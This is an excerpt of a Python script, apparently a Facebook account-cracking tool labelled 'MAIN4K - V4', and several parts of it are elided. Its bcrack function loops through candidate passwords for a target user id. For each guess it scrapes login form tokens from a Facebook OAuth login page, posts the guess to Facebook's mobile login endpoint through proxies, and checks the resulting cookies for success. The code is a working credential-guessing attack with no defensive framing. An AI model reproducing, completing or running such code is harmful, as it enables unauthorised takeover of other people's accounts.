...
Y8888P  YP   YP 88   YD    YP    Y888888P `8888Y'
              \x1b[1;91m—————— \x1b[1;97m[<MAIN4K - V4>] \x1b[1;91m——————
\033[1;97m———————————————————————————————————————————————""")
loop = 0
oks = []
cps = []
...
def bcrack(uid,pwx,tl):
	...
	try:
		for ps in pwx:
			...
			free_fb = session.get("https://x.facebook.com/login.php?skip_api_login=1&api_key=1427730400838960&kid_directed_site=0&app_id=1427730400838960&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D1427730400838960%26redirect_uri%3Dhttps%253A%252F%252Fmy.asos.com%252Fidentity%252Fsignin-facebook%26scope%3Dpublic_profile%252Cemail%26state%3DOhCJQEMUsGhviK-LjvB0yQkDGomlmXLhMtCJ28BmeqTlSwOHXazRKRcDCkDFyA2bMvywFy8pvzPnryQSIxxLV-zBcjCaQ1sV2OJIngEJWAs90heU74PRyv6j4rtIOfXX86Fqtjgu_PntAyVcd2C-orpJOG0sLy0ku6WmOEmnAcOfGInLr1yKOBKZUtKu2JrVT7T0MnBoKbTScCU8syFGs9Vcye4eVk3ELZ0GjD1VJxRfVEAu4wNfUOBUm-53NvG-X1ACFAdyJm99D55NZ4k_nH2R0C38mamxgOrvxqlyerYRLAOf%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D06748921-85ad-496b-81a8-f9b0c152f07a%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fmy.asos.com%2Fidentity%2Fsignin-facebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DOhCJQEMUsGhviK-LjvB0yQkDGomlmXLhMtCJ28BmeqTlSwOHXazRKRcDCkDFyA2bMvywFy8pvzPnryQSIxxLV-zBcjCaQ1sV2OJIngEJWAs90heU74PRyv6j4rtIOfXX86Fqtjgu_PntAyVcd2C-orpJOG0sLy0ku6WmOEmnAcOfGInLr1yKOBKZUtKu2JrVT7T0MnBoKbTScCU8syFGs9Vcye4eVk3ELZ0GjD1VJxRfVEAu4wNfUOBUm-53NvG-X1ACFAdyJm99D55NZ4k_nH2R0C38mamxgOrvxqlyerYRLAOf%23_%3D_&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated").text
			log_data = {'m_ts': re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1), 'li': re.search('name="li" value="(.*?)"', str(free_fb)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': uid, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"', str(free_fb)).group(1), 'bi_wvdp': '', 'pass': ps, 'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1), 'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1), 'fb_dtsg': '', '__dyn': '', '__csr': '', '__req': '3', '__fmt': '1', '__a': '',  '__user': '0'}
...
'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',}
			lo = session.post('https://m.facebook.com/login/device-based/login/async/?api_key=1427730400838960&auth_token=9291001de9571ed4bc3042aa1de01cda&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D1427730400838960%26redirect_uri%3Dhttps%253A%252F%252Fmy.asos.com%252Fidentity%252Fsignin-facebook%26scope%3Dpublic_profile%252Cemail%26state%3DOhCJQEMUsGhviK-LjvB0yQkDGomlmXLhMtCJ28BmeqTlSwOHXazRKRcDCkDFyA2bMvywFy8pvzPnryQSIxxLV-zBcjCaQ1sV2OJIngEJWAs90heU74PRyv6j4rtIOfXX86Fqtjgu_PntAyVcd2C-orpJOG0sLy0ku6WmOEmnAcOfGInLr1yKOBKZUtKu2JrVT7T0MnBoKbTScCU8syFGs9Vcye4eVk3ELZ0GjD1VJxRfVEAu4wNfUOBUm-53NvG-X1ACFAdyJm99D55NZ4k_nH2R0C38mamxgOrvxqlyerYRLAOf%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D06748921-85ad-496b-81a8-f9b0c152f07a%26tp%3Dunspecified%26cbt%3D1728318629347&refsrc=deprecated&app_id=1427730400838960&cancel=https%3A%2F%2Fmy.asos.com%2Fidentity%2Fsignin-facebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DOhCJQEMUsGhviK-LjvB0yQkDGomlmXLhMtCJ28BmeqTlSwOHXazRKRcDCkDFyA2bMvywFy8pvzPnryQSIxxLV-zBcjCaQ1sV2OJIngEJWAs90heU74PRyv6j4rtIOfXX86Fqtjgu_PntAyVcd2C-orpJOG0sLy0ku6WmOEmnAcOfGInLr1yKOBKZUtKu2JrVT7T0MnBoKbTScCU8syFGs9Vcye4eVk3ELZ0GjD1VJxRfVEAu4wNfUOBUm-53NvG-X1ACFAdyJm99D55NZ4k_nH2R0C38mamxgOrvxqlyerYRLAOf%23_%3D_&lwv=100',data=log_data,headers=header_freefb,proxies=proxs,allow_redirects=False).text
			log_cookies=session.cookies.get_dict().keys()
			#print(log_data)
			#print(free_fb)
			#print(lo)
